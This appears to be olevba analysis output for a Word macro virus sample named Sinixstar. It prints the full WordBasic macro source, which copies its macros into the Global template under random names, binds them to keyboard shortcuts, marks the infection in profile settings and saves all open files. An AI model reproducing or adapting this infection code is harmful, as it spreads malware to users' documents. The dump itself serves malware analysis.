olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Sinixstar-d061dfd4ea4521cc6e043eb7a18fdd23a33949c1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Sinixstar-d061dfd4ea4521cc6e043eb7a18fdd23a33949c1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Trojan.MSWord.Sinixstar-d061dfd4ea4521cc6e043eb7a18fdd23a33949c1 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
On Error GoTo Done

a$ = DateiName$()
If a$ = "" Then GoTo Finish

If VInstalled = 0 Then
    Run1
    Run2
    RunPayload
    DateiAllesSpeichern 1, 1
Else
    GoTo Done
End If

Done:
a$ = DateiName$()
If a$ = "" Then
    GoTo Finish
Else
    Einfügen " "
End If

Finish:
MsgBox "Sinixstar", -8
End Sub

Sub Run1()
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R1$ = AbrufenDokumentVar$("VirNameDoc")
CO$ = DateiName$() + ":" + R1$
MakroKopieren CO$, "Global:" + Z$, 1
SetProfileString "Intl", "Info2", Z$
ExtrasAnpassenTastatur.TastenSchlüssel = 65, .Kategorie = 2, .Name = Z$, .Hinzufügen, .Kontext = 0
End Sub

Sub Run2()
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R2$ = AbrufenDokumentVar$("VirName")
OC$ = DateiName$() + ":" + R2$
MakroKopieren OC$, "Global:" + Z$, 1
SetProfileString "Intl", "Info1", Z$
ExtrasAnpassenTastatur.TastenSchlüssel = 32, .Kategorie = 2, .Name = Z$, .Hinzufügen, .Kontext = 0
End Sub

Sub RunPayload()
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R3$ = AbrufenDokumentVar$("VirNamePayload")
OCO$ = DateiName$() + ":" + R3$
MakroKopieren OCO$, "Global:" + Z$, 1
SetProfileString "Intl", "Info3", Z$
End Sub

Function VInstalled()
CC$ = GetProfileString$("Intl", "Info1")
    VInstalled = 0
    If ZählenMakros(0) > 0 Then
        For i = 1 To ZählenMakros(0)
        If MakroName$(i, 0) = CC$ Then
            VInstalled = 1
        End If
    Next i
End If
End Function

Function Fun$(F$, G$, H$, J$)
One = 1169
Two = 9294
Num = Int(Rnd() * (Two - One) + One)
a$ = Str$(Num)
a$ = LTrim$(a$)

b$ = Mid$(a$, 1, 1)
C$ = Mid$(a$, 2, 1)
D$ = Mid$(a$, 3, 1)
e$ = Mid$(a$, 4, 1)

If b$ = "1" Then F$ = "A"
If b$ = "2" Then F$ = "B"
If b$ = "3" Then F$ = "C"
If b$ = "4" Then F$ = "D"
If b$ = "5" Then F$ = "E"
If b$ = "6" Then F$ = "F"
If b$ = "7" Then F$ = "G"
If b$ = "8" Then F$ = "H"
If b$ = "9" Then F$ = "I"
If b$ = "0" Then F$ = "J"

If C$ = "1" Then G$ = "H"
If C$ = "2" Then G$ = "I"
If C$ = "3" Then G$ = "J"
If C$ = "4" Then G$ = "K"
If C$ = "5" Then G$ = "L"
If C$ = "6" Then G$ = "M"
If C$ = "7" Then G$ = "N"
If C$ = "8" Then G$ = "O"
If C$ = "9" Then G$ = "P"
If C$ = "0" Then G$ = "Q"

If D$ = "1" Then H$ = "A"
If D$ = "2" Then H$ = "B"
If D$ = "3" Then H$ = "C"
If D$ = "4" Then H$ = "D"
If D$ = "5" Then H$ = "E"
If D$ = "6" Then H$ = "F"
If D$ = "7" Then H$ = "G"
If D$ = "8" Then H$ = "H"
If D$ = "9" Then H$ = "I"
If D$ = "0" Then H$ = "J"

If e$ = "1" Then J$ = "R"
If e$ = "2" Then J$ = "S"
If e$ = "3" Then J$ = "T"
If e$ = "4" Then J$ = "U"
If e$ = "5" Then J$ = "V"
If e$ = "6" Then J$ = "W"
If e$ = "7" Then J$ = "X"
If e$ = "8" Then J$ = "Y"
If e$ = "9" Then J$ = "Z"
If e$ = "0" Then J$ = "Q"

Fun$ = F$ + G$ + H$ + J$
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |"{e                 |Intl                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

